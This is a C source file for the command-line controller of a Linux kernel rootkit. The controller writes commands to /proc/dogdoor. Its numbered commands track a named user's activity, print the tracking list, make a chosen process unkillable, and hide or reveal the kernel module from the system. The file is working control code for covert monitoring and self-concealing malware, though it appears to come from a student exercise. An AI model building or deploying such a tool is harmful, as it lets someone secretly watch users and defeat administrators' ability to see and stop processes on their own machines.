#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>

#include <sys/types.h>
#include <pwd.h>


int main(int argc, char *argv[])
{

	int key = -1 ;
    int process_id = -1 ;
	char user_name[128] = { 0x0, } ;
	char temp_process[128] = { 0x0, } ;
	FILE *write_fp = fopen("/proc/dogdoor", "w") ; ;
	FILE *read_fp = fopen("/proc/dogdoor", "r") ;
	char temp_string[512] = {0x0, };

    if (argc == 1) {
        printf("HI ~! I'm BINGO! Give the command number :) \n\n") ;
        printf("====================================================\n") ;
		printf("1. Give me a user name you want to track.\n") ;
		printf("2. Retrieve the tracking list.\n") ;
		printf("3. Specify a process ID.\n") ; 
		printf("4. Stop immortality.\n") ;
		printf("5. Make module disapper.\n") ;
		printf("6. Toggle.\n") ;
		printf("====================================================\n\n\n") ;

		return -1 ;
	}

	if (write_fp == NULL || read_fp == NULL) {
		printf("Access Dogdoor failed.\n") ;
		return -1 ;
	}

	key = atoi(argv[1]) ;
 
	switch(key) {
		case 1 :
			if(argc != 3) {
				printf("Invalid Argument\n") ;
				return -1 ;
			}
			
			struct passwd *pwd = calloc(1, sizeof(struct passwd)) ;
			size_t buffer_len = sysconf(_SC_GETPW_R_SIZE_MAX) * sizeof(char) ;
			char *buffer = malloc(buffer_len);
			strcpy(user_name, argv[2]) ;

			getpwnam_r(argv[2], pwd, buffer, buffer_len, &pwd) ;

			fprintf(write_fp, "%d:%d", 1, pwd->pw_uid) ;
			fclose(write_fp) ;

			printf("Tracking start.\n") ;

			break ;
		
		case 2 : 
			for(int i=0 ; i<10 ; i++) {
				fscanf(read_fp, "%s\n", temp_string) ;
				printf("%s\n", temp_string) ;
			}	

			fclose(read_fp) ;
			fclose(write_fp) ;
			break ;

		case 3 :
			if (argc != 3) {
				printf("Invalid Argument\n") ;
				return -1 ;
			}
			strcpy(temp_process, argv[2]) ;
			process_id = atoi(temp_process) ;
				
            fprintf(write_fp, "3:%d", process_id) ;
            fclose(write_fp) ;

            printf("Prevent %d Killing Start.\n", process_id) ;
            break ;

		case 4 : 
            fprintf(write_fp, "4:stop") ;
            fclose(write_fp) ;

            printf("Release Immortality.\n") ;
            break ;
				
		case 5 : 
            fprintf(write_fp, "5:disapper") ;
            fclose(write_fp) ;

            printf("Make Module Disapper.\n") ;
            break ;
				
		case 6 :
            fprintf(write_fp, "6:toggle") ;
            fclose(write_fp) ;

            printf("Make Module Appear.\n") ;
            break ;
				
		default :
			printf("Wrong Command Number.\n") ;
			break ;
	}
	
	fclose(read_fp) ;
}

